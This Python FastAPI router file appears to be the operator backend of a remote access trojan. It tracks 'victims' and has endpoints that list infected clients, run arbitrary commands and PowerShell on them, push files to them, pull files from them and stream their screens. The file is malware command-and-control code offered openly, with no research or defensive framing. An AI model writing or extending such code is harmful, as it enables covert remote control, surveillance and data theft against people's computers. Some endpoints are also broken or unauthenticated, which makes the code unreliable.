from fastapi import Depends, APIRouter, UploadFile, File
from fastapi.responses import HTMLResponse
from auth.dependencies import *
from models.user import User
from host.server import RATServer
import urllib.parse
import json
from pydantic import BaseModel
from database.DataManager import PostgreSQLDataManager

app = APIRouter()


@app.get("/clients")
async def read_users_me():
    DataManager = PostgreSQLDataManager()

    clients = DataManager.get_clients()
    DataManager.close_connection()
    if clients is None:
        return {"clients": "Not found"}
    return {"clients": clients}
    # prettyClients = []
    # print(RAT_SERVER.instance.victims)
    # for client in RAT_SERVER.instance.victims:
    #     prettyClients.append(
    #         {"name": client["Name"], "ip": client["IPv4"], "status": "Online", "uuid": client["ID"]})

    # return {"clients": prettyClients}


@app.get("/clients/{id}")
async def read_user_me(id: str, current_user: User = Depends(get_current_user)):
    DataManager = PostgreSQLDataManager()
    client = DataManager.get_client(id)
    DataManager.close_connection()
    if client is not None:
        return {"client": client}
    return {"client": "Not found"}


@app.post("/clients/{id}/command")
async def execute_command(id: str, command_type: str, command: str, current_user: User = Depends(get_current_user)):
    print(f"[*] Received command {command} of type {command_type} for {id}")
    command = urllib.parse.unquote(command)

    DataManager = PostgreSQLDataManager()
    socket_ip = DataManager.get_socket_ip(id)
    DataManager.close_connection()

    if (socket_ip == None):
        return {"output": "Error: Client not found"}
    RATServer.instance.execute(command_type, command, socket_ip)
    output = RATServer.instance.receive_output(socket_ip)
    # Turn the string into a JSON
    print(output)
    if output is None or output == "Error receiving output":
        return {"output": {"Error": "Output not received", "result": "Error receiving output"}}
    output = json.loads(output)
    return {"output": output}


@app.post("/clients/{id}/upload")
async def upload_file(id: str, file: UploadFile = File(...)):
    client = []
    if (client == []):
        return {"output": "Error: Client not found"}

    await RATServer.instance.transfer_file(client[0], file)
    return {"output": "File transfer started"}

@app.get("/clients/{id}/disk")
async def get_disk(id: str, current_user: User = Depends(get_current_user)):
    DataManager = PostgreSQLDataManager()
    client = DataManager.get_all_client_info(id)
    DataManager.close_connection()

    if (client == None):
        return {"output": "Error: Client not found"}
    
    print(client)
    
    client = client["data"]["System Info"]
    client = json.loads(client)
    return {"disk": client["Hardware"]["Disk"]}



class PowerShellSuggestions(BaseModel):
    command: str


@app.post("/clients/{id}/powershell_suggestions")
async def powershell_suggestions_terminal(id: str, PowerShellSuggestions: PowerShellSuggestions):
    responses = await RATServer.instance.powershell_suggestions_terminal(id, PowerShellSuggestions.command)
    return {"output": responses}


@app.post("/clients/{id}/download")
async def upload_file(id: str, path: str):
    for victim in RATServer.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RATServer.instance.victims.index(victim)

            await RATServer.instance.download_file(victim, path)
            return {"output": "File download started"}
    return {"output": "Error: Client not found"}


@app.get("/clients/{id}/screenshare")
async def start_screenshare(id: str):
    for victim in RATServer.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RATServer.instance.victims.index(victim)
            print("Starting screenshare")

            print(victim)

            if (victim["SCREENSHARE_SOURCE"] == ""):
                return {"output": "Error: Screenshare not started"}

            source = victim["SCREENSHARE_SOURCE"]

            return HTMLResponse(content=f"<video width='320' height='240' controls><source src='" + source + "' type='video/mp4'></video>", status_code=200)
    return {"output": "Error: Client not found"}

@app.get("/clients/{id}/advanced")
async def get_advanced(id: str):
    for victim in RATServer.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RATServer.instance.victims.index(victim)

            print("Getting advanced")

            print(victim)

            if (victim["ADVANCED"] == ""):
                return {"output": "Error: Advanced not started"}

            source = victim["ADVANCED"]

            return HTMLResponse(content=f"<video width='320' height='240' controls><source src='" + source + "' type='video/mp4'></video>", status_code=200)
    return {"output": "Error: Client not found"}